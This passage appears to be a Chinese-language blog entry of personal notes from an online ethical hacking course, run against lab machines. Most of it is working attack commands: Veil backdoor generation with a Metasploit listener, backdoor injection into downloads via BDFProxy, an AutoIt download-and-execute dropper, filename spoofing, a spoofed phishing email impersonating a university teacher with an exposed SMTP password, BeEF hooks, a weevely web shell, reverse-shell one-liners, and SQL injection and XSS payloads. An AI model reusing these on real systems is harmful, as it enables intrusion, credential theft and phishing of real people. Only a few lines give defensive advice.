alt="99"><br>上面為此後門訊息，下面為我們可設定的選項</p></blockquote><blockquote><p>設定自己ip及端口，讓目標連過來</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 192.168.17.132</span><br><span class="line">set LPORT 8080</span><br></pre></td></tr></table></figure><blockquote><p>設定一些選項，使得不被防毒偵測(設定這些沒有原因只為了讓后門看起來不一樣)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set PROCESSORS 1 #設定處理器</span><br><span class="line">set SLEEP 7      #設定睡眠?秒</span><br></pre></td></tr></table></figure><blockquote><p>生成后門</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">generate</span><br><span class="line">rev_https_8080  #給后門取名</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Ethical_Hacking/100.jpg" alt="100"><br>生成成功</p></blockquote><h4 id="用metasploit框架監聽回應"><a href="#用metasploit框架監聽回應" class="headerlink" title="用metasploit框架監聽回應"></a>用metasploit框架監聽回應</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line">show options</span><br><span class="line">set LHOST 192.168.17.132</span><br><span class="line">set LPORT 8080</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/101.jpg" alt="101"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><blockquote><p>打開后門<br><img src="/photo/Ethical_Hacking/102.jpg" alt="102"></p></blockquote><blockquote><p>成功控制電腦<br><img src="/photo/Ethical_Hacking/103.jpg" alt="103"></p></blockquote><h4 id="BDFProxy-必須先成為中間人"><a href="#BDFProxy-必須先成為中間人" class="headerlink" title="BDFProxy(必須先成為中間人)"></a>BDFProxy(必須先成為中間人)</h4><blockquote><p>到安裝BDFProxy的位置(&#x2F;opt&#x2F;BDFProxy&#x2F;)<br>打開配置文件，將mode改成transparent<br><img src="/photo/Ethical_Hacking/104.jpg" alt="104"><br>將下圖區塊的host的ip改為自己電腦的，並儲存(如果目標是linux或mac就改linux和mac的區塊host)<br><img src="/photo/Ethical_Hacking/105.jpg" alt="105"></p></blockquote><blockquote><p>到終端機輸入以下指令:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/BDFProxy/</span><br><span class="line">./bdf_proxy.py</span><br></pre></td></tr></table></figure><blockquote><p>再打開一個終端(成為中間人)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface eth0 -caplet /root/spoof.cap</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Ethical_Hacking/106.jpg" alt="106"></p></blockquote><blockquote><p>再開一個終端，用一個防火牆把bettercap收到的訊息轉到BDFProxy</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 </span><br></pre></td></tr></table></figure><blockquote><p>開啟監聽</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  --resource /opt/BDFProxy/bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure><blockquote><p>當目標下載任意exe檔時會被植入後門<br><img src="/photo/Ethical_Hacking/107.jpg" alt="107"></p></blockquote><h4 id="maltego"><a href="#maltego" class="headerlink" title="maltego"></a>maltego</h4><blockquote><p>開啟maltego，並登錄帳號密碼<br>開啟一的新檔<br><img src="/photo/Ethical_Hacking/108.jpg" alt="108"></p></blockquote><h4 id="將後門結合文件"><a href="#將後門結合文件" class="headerlink" title="將後門結合文件"></a>將後門結合文件</h4><blockquote><p>下載或編寫腳本:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;StaticConstants.au3&gt;</span><br><span class="line">#include &lt;WindowsConstants.au3&gt;</span><br><span class="line"></span><br><span class="line">Local $urls = &quot;url1,url2&quot;</span><br><span class="line"></span><br><span class="line">Local $urlsArray = StringSplit($urls, &quot;,&quot;, 2 )</span><br><span class="line"></span><br><span class="line">For $url In $urlsArray</span><br><span class="line">$sFile = _DownloadFile($url)</span><br><span class="line">shellExecute($sFile)</span><br><span class="line"></span><br><span class="line">Next</span><br><span class="line"></span><br><span class="line">Func _DownloadFile($sURL)</span><br><span class="line">    Local $hDownload, $sFile</span><br><span class="line">    $sFile = StringRegExpReplace($sURL, &quot;^.*/&quot;, &quot;&quot;)</span><br><span class="line">    $sDirectory = @TempDir &amp; $sFile</span><br><span class="line">    $hDownload = InetGet($sURL, $sDirectory, 17, 1)</span><br><span class="line">    InetClose($hDownload)</span><br><span class="line">    Return $sDirectory</span><br><span class="line">EndFunc   ;==&gt;_GetURLImage</span><br></pre></td></tr></table></figure><blockquote><p>將url1和url2分別改成你的偽裝文件和後門的網址<br><img src="/photo/Ethical_Hacking/109.jpg" alt="109"><br>將副檔名改成au3</p></blockquote><blockquote><p>開啟compile(veil)<br>選擇編寫好的腳本<br>到IconArchive下載圖標或者上網將圖片轉為<a href="http://www.rw-designer.com/image-to-icon">上網將圖片轉為圖標</a><br><img src="/photo/Ethical_Hacking/111.jpg" alt="111"><br>convert<br>將檔案改名，並讓使用者下載並啟動(後門即可連接)<br><img src="/photo/Ethical_Hacking/112.jpg" alt="112"></p></blockquote><h4 id="將後門結合文件的副檔名偽裝"><a href="#將後門結合文件的副檔名偽裝" class="headerlink" title="將後門結合文件的副檔名偽裝"></a>將後門結合文件的副檔名偽裝</h4><blockquote><p>開啟一個文本<br>輸入檔名(例如:good.exe)<br>將檔名改變由右而左偽裝(goodgpj.exe)<br>開啟character，並找到由右到左的符號並在gpj前插入<br><img src="/photo/Ethical_Hacking/113.jpg" alt="113"><br><img src="/photo/Ethical_Hacking/114.jpg" alt="114"><br>並將新檔名複製到檔案上即可<br>ps:有時下載時會將符號拿掉，因此要壓縮後再讓使用者下載</p></blockquote><h4 id="發送後門利用假電子郵件"><a href="#發送後門利用假電子郵件" class="headerlink" title="發送後門利用假電子郵件"></a>發送後門利用假電子郵件</h4><blockquote><p><a href="https://app-smtp.brevo.com/">在brevo註冊一個帳號</a><br><img src="/photo/Ethical_Hacking/115.jpg" alt="115"></p></blockquote><blockquote><p>到kali linux裡打開發送郵件的程序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sendemail --help</span><br><span class="line">sendemail -xu ray784523@gmail.com -xp zOsq1dZ0FM2Jmfgc -s smtp-relay.brevo.com:587 -f &quot;noreply@moodle.mcu.edu.tw&quot; -t &quot;ray784523@gmail.com&quot; -u &quot;陳詠智老師在moodle的發布一條訊息&quot; -m &quot;36201-36201視窗設計:陳 詠智老師在moodle的發布一條訊息,請查看以下檔案:https://www.dropbox.com/scl/fi/otcdpkv8bxavxixu8sppn/good.rar?rlkey=4gjotyd07f01ro8t7hwr7h506&amp;dl=1&quot; -o message-header=&quot;From: 陳 詠智經由(School of Information Technology)&quot;</span><br></pre></td></tr></table></figure><blockquote><p>sendemail -xu <a href="mailto:&#x72;&#x61;&#121;&#x37;&#x38;&#x34;&#53;&#50;&#x33;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#109;">&#x72;&#x61;&#121;&#x37;&#x38;&#x34;&#53;&#50;&#x33;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#109;</a> -xp zOsq1dZ0FM2Jmfgc -s 伺服器名稱:端口 -f “發信人” -t “目標” -u “標題” -m “正文+木馬連結” -o message-header&#x3D;”From: 消息表頭&lt;電子郵件&gt;” -o message-charset&#x3D;UTF-8</p></blockquote><blockquote><p>模仿參考網站:<a href="https://easydmarc.com/tools/dmarc-lookup">easydmarc.com</a></p></blockquote><h4 id="Beef"><a href="#Beef" class="headerlink" title="Beef"></a>Beef</h4><blockquote><p>打開Beef,並登入<br><img src="/photo/Ethical_Hacking/116.jpg" alt="116"></p></blockquote><blockquote><p>讓使用者電腦想辦法運行以下js(中間人攻擊，dns欺騙，釣魚網站等):</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>使得kali透過web與使用者掛勾<br>當使用者運行此代碼網頁時，beef會出現一個可控制的瀏覽器:<br><img src="/photo/Ethical_Hacking/117.jpg" alt="117"><br>圖示表示:<br><img src="/photo/Ethical_Hacking/118.jpg" alt="118"></p></blockquote><blockquote><p>點開控制電腦的主選單:<br><img src="/photo/Ethical_Hacking/119.jpg" alt="119"><br>commands:可執行的腳本<br>舉例:<br>alert<br><img src="/photo/Ethical_Hacking/120.jpg" alt="120"><br>設定完後按execute<br><img src="/photo/Ethical_Hacking/121.jpg" alt="121"><br>可執行任意js<br><img src="/photo/Ethical_Hacking/122.jpg" alt="122"><br>設定完後按execute<br><img src="/photo/Ethical_Hacking/123.jpg" alt="123"><br>可獲得電腦的螢幕截圖<br><img src="/photo/Ethical_Hacking/124.jpg" alt="124"><br>導向到別的網頁<br><img src="/photo/Ethical_Hacking/125.jpg" alt="125"><br>社交工程(竊取帳密)<br><img src="/photo/Ethical_Hacking/126.jpg" alt="126"><br>受害機畫面<br><img src="/photo/Ethical_Hacking/127.jpg" alt="127"><br>輸入受害機帳密之後<br><img src="/photo/Ethical_Hacking/128.jpg" alt="128"><br>偽裝更新植入後門<br><img src="/photo/Ethical_Hacking/129.jpg" alt="129"></p></blockquote><h4 id="預防方法"><a href="#預防方法" class="headerlink" title="預防方法:"></a>預防方法:</h4><blockquote><ol><li>開檔前檢查文件屬性</li><li>使用sandbox打開文件或用線上沙盒分析</li></ol></blockquote><h3 id="網站hack"><a href="#網站hack" class="headerlink" title="網站hack"></a>網站hack</h3><h4 id="資料收集網站"><a href="#資料收集網站" class="headerlink" title="資料收集網站"></a>資料收集網站</h4><blockquote><p>查找關於擁有者資訊<br>網址:<a href="https://whois.domaintools.com/">whois</a><br>查詢目標的技術<br>網址:<a href="https://sitereport.netcraft.com/">netcraft</a><br>關於網頁全面訊息<br>網址:<a href="https://www.robtex.com/">robtex</a></p></blockquote><h4 id="找出子網域"><a href="#找出子網域" class="headerlink" title="找出子網域"></a>找出子網域</h4><blockquote><p>工具:knockpy<br>指令:knockpy [網域]<br><img src="/photo/Ethical_Hacking/130.jpg" alt="130"></p></blockquote><h4 id="目標網站文件查找"><a href="#目標網站文件查找" class="headerlink" title="目標網站文件查找"></a>目標網站文件查找</h4><blockquote><p>工具:dirb<br>指令:dirb [target] [wordlist] [options]<br>使用方法:man dirb<br>指令:dirb <a href="http://192.168.212.104/mutillidae/">http://192.168.212.104/mutillidae/</a><br><img src="/photo/Ethical_Hacking/131.jpg" alt="131"></p></blockquote><h4 id="上傳漏洞"><a href="#上傳漏洞" class="headerlink" title="上傳漏洞"></a>上傳漏洞</h4><blockquote><p>工具:weevly<br>用途:生成shell，Web服务器上执行命令的后门，使得用户能够管理被攻击的Web服务器、执行服务器端代码<br>指令:weevely generate 097887 &#x2F;root&#x2F;shell.php<br>weevely generate 密碼 生成位置</p></blockquote><blockquote><p>啟動Metasploitable，並登錄DVWA網站<br><img src="/photo/Ethical_Hacking/132.JPG" alt="132"><br>上傳shell並複製其檔案存放的網址<br><img src="/photo/Ethical_Hacking/133.JPG" alt="133"></p></blockquote><blockquote><p>切換到kali<br>指令:weevely <a href="http://192.168.212.104/dvwa/hackable/uploads/shell.php">http://192.168.212.104/dvwa/hackable/uploads/shell.php</a> 097887<br>即可成功控制<br><img src="/photo/Ethical_Hacking/134.JPG" alt="134"></p></blockquote><h4 id="代碼執行漏洞"><a href="#代碼執行漏洞" class="headerlink" title="代碼執行漏洞"></a>代碼執行漏洞</h4><p><img src="/photo/Ethical_Hacking/135.jpg" alt="135"></p><blockquote><p>在網頁上輸入ip位置，網頁應用程式會傳回server，在server上執行ping<br>可用;作為分隔符號，將兩命令串接再一起，當執行完前面指令時，執行新的命令</p></blockquote><p><img src="/photo/Ethical_Hacking/136.jpg" alt="136"></p><blockquote><p>可參照以下指令來進行遠程連結<br>The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.<br>Therefore in all f these cases you need to listen for port 8080 using the foolowing command<br>nc -vv -l -p 8080<br>BASH<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.20.14.203&#x2F;8080 0&gt;&amp;1<br>PERL<br>perl -e ‘use Socket;$i&#x3D;”10.20.14”;$p&#x3D;8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’<br>Python<br>python -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.20.14”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’<br>PHP<br>php -r ‘$sock&#x3D;fsockopen(“10.20.14”,8080);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br>Ruby<br>ruby -rsocket -e’f&#x3D;TCPSocket.open(“10.20.14”,8080).to_i;exec sprintf(“&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’<br>Netcat<br>nc -e &#x2F;bin&#x2F;sh 10.20.14 8080</p></blockquote><blockquote><p>監聽8080端口<br><img src="/photo/Ethical_Hacking/137.jpg" alt="137"><br>在網頁應用程式輸入:192.168.1.1;nc -e &#x2F;bin&#x2F;sh 192.168.212.104 8080<br><img src="/photo/Ethical_Hacking/138.jpg" alt="138"></p></blockquote><p><img src="/photo/Ethical_Hacking/139.jpg" alt="139"></p><h4 id="local-File-Inclusion"><a href="#local-File-Inclusion" class="headerlink" title="local File Inclusion"></a>local File Inclusion</h4><blockquote><p>利用此類型漏洞讀取同一伺服器的所有文件<br><img src="/photo/Ethical_Hacking/140.jpg" alt="140"><br>修改URL參數<br><img src="/photo/Ethical_Hacking/141.jpg" alt="141"></p></blockquote><h4 id="REMOTE-FILE-INCLUSION"><a href="#REMOTE-FILE-INCLUSION" class="headerlink" title="REMOTE FILE INCLUSION"></a>REMOTE FILE INCLUSION</h4><blockquote><p>伺服器支持allow_url_fopen和allow_url_include<br>伺服器設定檔:&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini<br><img src="/photo/Ethical_Hacking/142.jpg" alt="142"><br>重啟網頁伺服器:sudo &#x2F;etc&#x2F;init.d&#x2F;apache2 restart</p></blockquote><blockquote><p>在自己本地機上創建並編輯一個文件:<br><img src="/photo/Ethical_Hacking/143.jpg" alt="143"></p></blockquote><blockquote><p>在 PHP 中，passthru() 函数是用来执行外部程序并且直接显示原始输出的。它与其他执行外部命令的函数（如 exec()、shell_exec() 和 system()）类似，但有一些区别。<br>passthru() 通常用于需要捕获程序输出的场景，特别是二进制数据，如直接从 PHP 脚本传输图像或音频文件。当调用 passthru() 时，PHP 会等待外部程序执行完成，并将程序的原始输出直接传递到 PHP 的输出流。</p></blockquote><blockquote><p>將文件放在:<br><img src="/photo/Ethical_Hacking/144.jpg" alt="144"></p></blockquote><blockquote><p>更改網址<br><img src="/photo/Ethical_Hacking/145.jpg" alt="145"></p></blockquote><p><img src="/photo/Ethical_Hacking/146.jpg" alt="146"></p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><h4 id="myspl"><a href="#myspl" class="headerlink" title="myspl"></a>myspl</h4><blockquote><p>連接:mysql -u 帳號 -h ip地址<br>列出所有資料庫:show databases;<br>選擇資料庫:use [資料庫名稱]<br>列出所在資料庫中的資料表:show tables;<br>列出資料表內容:select * from [資料表名稱];</p></blockquote><h4 id="SQL-Injection-POST"><a href="#SQL-Injection-POST" class="headerlink" title="SQL Injection(POST)"></a>SQL Injection(POST)</h4><blockquote><p><img src="/photo/Ethical_Hacking/147.jpg" alt="147"><br>當輸入帳密為zaid和123456時，後端會執行這指令從資料庫搜尋帳密是否存在:SELECT * FROM accounts WHERE username&#x3D;’zaid’ AND password&#x3D;’123456’<br>當我們輸入帳密為zaid和&#39; and 1&#x3D;1 #會變成SELECT * FROM accounts WHERE username&#x3D;’zaid’ AND password&#x3D;&#39;&#39; or 1&#x3D;1 #’，1&#x3D;1為ture，因此不管密碼是否正確後面都為真<br>符號:#可使後面程式碼被註解<br>當我們輸入帳密為admin’#和&#39; and 1&#x3D;1 #會變成SELECT * FROM accounts WHERE username&#x3D;’admin’# AND password&#x3D;’’，#會註解後面程式碼，因此不用驗證密碼</p></blockquote><h4 id="SQL-Injection-GET"><a href="#SQL-Injection-GET" class="headerlink" title="SQL Injection(GET)"></a>SQL Injection(GET)</h4><p><img src="/photo/Ethical_Hacking/148.jpg" alt="148"></p><blockquote><p>上圖網址:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a><br>注入order by:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ order by 1%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br>%23為#的編碼<br>当攻击者尝试 ORDER BY 10000 这样的注入时，它们可能在测试数据库表中有多少列。如果 ORDER BY 10000 导致错误，表示表中没有那么多列。通过逐步调整数字，攻击者可以确定表的确切列数。<br>當輸入5時正常<br><img src="/photo/Ethical_Hacking/149.jpg" alt="149"><br>輸入6時出錯<br><img src="/photo/Ethical_Hacking/150.jpg" alt="150"><br>代表這個帳戶表有5列<br>可注入union slect 1,2,3,4,5:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,2,3,4,5%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/151.jpg" alt="151"><br>確定有5列，其中2,3,4會被顯示<br>可注入union slect 1,database(),user(),version(),5:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,database(),user(),version(),5%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/152.jpg" alt="152"><br>可知資料庫為:owasp10，使用者:root@locale及版本<br>可注入union select 1,table_name,null,null,5 from information_schema.tables(SQL預設的表):<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,table_name,null,null,5 from information_schema.tables%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/153.jpg" alt="153"></p></blockquote><blockquote><p>SELECT 1, table_name, NULL, NULL, 5：这是在选择几列数据。第一列和最后一列是硬编码的数值1和5。第二列是 table_name，它来自于 information_schema.tables 这个特殊的表，该表存储了数据库中所有表的名称。第三和第四列是用 NULL 填充的，这通常是因为原始 SQL 查询需要有相同数目的列来匹配结构，而攻击者可能不关心这些列的具体内容。</p></blockquote><blockquote><p>FROM information_schema.tables：information_schema 是一个内建数据库，包含了数据库的元数据，如表名、列名、数据类型等信息。information_schema.tables 是其中的一个表，包含了所有用户表和系统表的列表</p></blockquote><blockquote><p>可注入union select 1,table_name,null,null,5 from information_schema.tables where table_schema &#x3D; ‘owasp10’:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,table_name,null,null,5 from information_schema.tables where table_schema &#x3D; ‘owasp10’%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/154.jpg" alt="154"></p></blockquote><blockquote><p>可注入union select 1,column_name,null,null,5 from information_schema.column where table_name &#x3D; ‘accounts’:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,column_name,null,null,5 from information_schema.columns where table_name &#x3D; ‘accounts’%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/155.jpg" alt="155"><br>FROM information_schema.columns 指定了查询的数据来源。information_schema.columns 是数据库的一个特殊表，它包含了数据库中所有表的列信息。</p></blockquote><blockquote><p>可注入union select 1,username,password,is_admin,5 from accounts:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,username,password,is_admin,5 from accounts%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/156.jpg" alt="156"></p></blockquote><h4 id="SQL注入文件"><a href="#SQL注入文件" class="headerlink" title="SQL注入文件"></a>SQL注入文件</h4><blockquote><p>讀取伺服器文件<br>可注入union select null,load_file(‘&#x2F;etc&#x2F;passwd’),null,null,null :<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select null,load_file(‘&#x2F;etc&#x2F;passwd’),null,null,null%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details</p></blockquote><blockquote><p>向伺服器寫入一些內容<br>可注入union select null,’example example’,null,null,null into outfile ‘&#x2F;tmp&#x2F;example.txt’:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select null,’example example’,null,null,null into outfile ‘&#x2F;tmp&#x2F;example.txt’%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/157.jpg" alt="157"><br><img src="/photo/Ethical_Hacking/158.jpg" alt="158"></p></blockquote><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><blockquote><p>sqlmap -u ‘網址’<br>查看所有資料庫:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –dbs<br><img src="/photo/Ethical_Hacking/159.jpg" alt="159"><br>查看當前帳號:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –current-user<br>查看當前數據庫:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –current-db<br>查看數據庫的table:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –tables -D ‘owasp10’<br>查看table columns名稱:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –columns -T accounts -D owasp10<br>查看所有數據:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘  -T accounts -D owasp10 –dump<br><img src="/photo/Ethical_Hacking/160.jpg" alt="160"></p></blockquote><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h4><p><img src="/photo/Ethical_Hacking/161.jpg" alt="161"></p><blockquote><p>嘗試注入代碼:&lt;script&gt;alert(“XSS”)</script><br><img src="/photo/Ethical_Hacking/162.jpg" alt="162"></p></blockquote><h4 id="Stores-XSS"><a href="#Stores-XSS" class="headerlink" title="Stores XSS"></a>Stores XSS</h4><blockquote><p>可將代碼儲存在網頁上，任何人瀏覽網頁時都會執行<br>在網上輸入代碼並儲存<br><img src="/photo/Ethical_Hacking/164.jpg" alt="164"><br>每當進入此頁面時都會執行<br><img src="/photo/Ethical_Hacking/163.jpg" alt="164"></p></blockquote><h4 id="BEFF與XSS結合"><a href="#BEFF與XSS結合" class="headerlink" title="BEFF與XSS結合"></a>BEFF與XSS結合</h4><blockquote><p>打開beff，並將js代碼複製到xss網站上<br><img src="/photo/Ethical_Hacking/165.jpg" alt="165"><br>因為有字數限制開啟檢查修改繞過<br>將&lt;textarea name&#x3D;”mtxMessage” cols&#x3D;”50” rows&#x3D;”3” maxlength&#x3D;”50”&gt;&lt;&#x2F;textarea&gt;更改為&lt;textarea name&#x3D;”mtxMessage” cols&#x3D;”50” rows&#x3D;”3” maxlength&#x3D;”500”&gt;&lt;&#x2F;textarea&gt;<br><img src="/photo/Ethical_Hacking/166.jpg" alt="166"><br>注入代碼後每當使用者進入網站時就會執行<br><img src="/photo/Ethical_Hacking/167.jpg" alt="167"></p></blockquote><h3 id="owasp-zed-attack-proxy-ZAP"><a href="#owasp-zed-attack-proxy-ZAP" class="headerlink" title="owasp zed attack proxy(ZAP)"></a>owasp zed attack proxy(ZAP)</h3><blockquote><p>開啟ZAP<br>新增活動掃描<br><img src="/photo/Ethical_Hacking/168.jpg" alt="168"><br>開啟設定<br>這裡可更改掃描的強度<br><img src="/photo/Ethical_Hacking/169.jpg" alt="169"><br>設定完後輸入網址並開始掃描<br><img src="/photo/Ethical_Hacking/170.jpg" alt="170"><br>掃描完成可看到左邊的網站，及下方的警告<br><img src="/photo/Ethical_Hacking/171.jpg" alt="171"><br>下方的警告旗幟顏色紅色危害最大<br>可點擊查看有關漏洞訊息<br><img src="/photo/Ethical_Hacking/172.jpg" alt="172"><br>點擊右鍵在瀏覽器打開<br><img src="/photo/Ethical_Hacking/174.jpg" alt="173"><br><img src="/photo/Ethical_Hacking/174.jpg" alt="174"></p></blockquote><p>資安報告參考範例:<a href="https://github.com/juliocesarfort/public-pentesting-reports">public-pentesting-reports</a></p><h4 id="保護網站"><a href="#保護網站" class="headerlink" title="保護網站:"></a>保護網站:</h4><blockquote><ol><li>編寫安全代碼</li><li>審查代碼</li><li>滲透測試</li><li>錯誤懸賞</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Udemy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 筆記 </tag>
            
            <tag> Udemy </tag>
            
            <tag> 道德黑客 </tag>
            
            <tag> 自學 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Firebase(NOSQL)串接</title>
      <link href="/2023/12/10/Firebase%20NOSQL%E4%B8%B2%E6%8E%A5/"/>
      <url>/2023/12/10/Firebase%20NOSQL%E4%B8%B2%E6%8E%A5/</url>
      
